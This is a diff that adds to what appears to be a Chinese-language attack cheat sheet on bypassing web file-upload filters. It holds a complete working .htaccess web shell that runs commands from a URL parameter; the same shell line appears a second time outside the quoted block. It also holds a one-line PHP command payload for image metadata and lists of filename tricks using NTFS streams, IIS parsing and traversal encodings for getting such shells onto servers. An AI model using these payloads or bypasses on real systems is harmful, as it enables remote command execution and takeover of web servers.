@@ -66,3 +66,55 @@ tags:
         用法:x.php?0=system post data:1=whoami,上面链接中的payload见如下phppayload
 
 <a href="https://www.idontplaydarts.com/images/phppng.png">phppayload</a>
+
+    5>https://www.nds.rub.de/media/attachments/files/2012/11/File-in-the-hole.pdf
+        多种上传技巧:
+        a)将.htaccess本身作为webshell,解析本身.htaccess作为php
+            http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html
+            -----------------------自解析.htaccess--------------------------------
+            # Self contained .htaccess web shell - Part of the htshell project
+            # Written by Wireghoul - http://www.justanotherhacker.com
+
+            # Override default deny rule to make .htaccess file accessible over web
+            <Files ~ "^\.ht">
+            Order allow,deny
+            Allow from all
+            </Files>
+
+            # Make .htaccess file be interpreted as php file. This occur after apache has interpreted
+            # the apache directoves from the .htaccess file
+            AddType application/x-httpd-php .htaccess
+
+            ###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
+            -----------------------自解析.htaccess--------------------------------
+
+###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
+        b)NTFS ADS
+            1."file.asp::$data"=="file.asp"
+            2."/folder:$i30:$Index_allocation"=="/folder"
+            3.".htaccess:.jpg" -> make empty ".htaccess"=="HTACCESS~1"
+                适用于.htaccess不让上传情况下,估计一般情况下都不让上传隐藏文件,这时通过burp将文件名名改成
+                .htaccess:.jpg则可上传.htaccess文件
+            4.通过文件上传来创建文件夹(windows下)
+                https://www.youtube.com/v/Ws2JrZG679Q?version=3&hl=en_US&rel=0&vq=hd720
+                detail:将文件名通过burp改成file::$Index_Allocation或者是file:$I30:$Index_Allocation,这样就会在服务器上新建file文件夹
+        c)绕过../和..\保护:
+            https://www.youtube.com/v/HjS6Pob5t34?version=3&hl=en_US&rel=0&vq=hd720
+            ../改成.. /(..%20/)
+            ..\改成.. \(..%20\)
+        d)iis:
+            file.asp;.jpg以asp解析
+            /folder.asp/file.txt以asp解析
+        e)文件名后有被忽略字符
+            "test.asp . .. ." == "test.asp" 
+            "test.php<>" == "test.php"
+        f)在图片文件的文件属性中添加copyright属性为:
+            <?=$_GET[0]($_POST[1]);?>
+            这个暂时没有找到工具,好像要用photoshop
+        g)"file.p.phphp"==>"file.php" 
+        h)配置有误情况下:
+            "/file.jpg/index.php"会将file.jpg按照php解析
+        i)常见content-type"白名单":
+            image/gif
+            image/jpeg
+            image/pjpeg
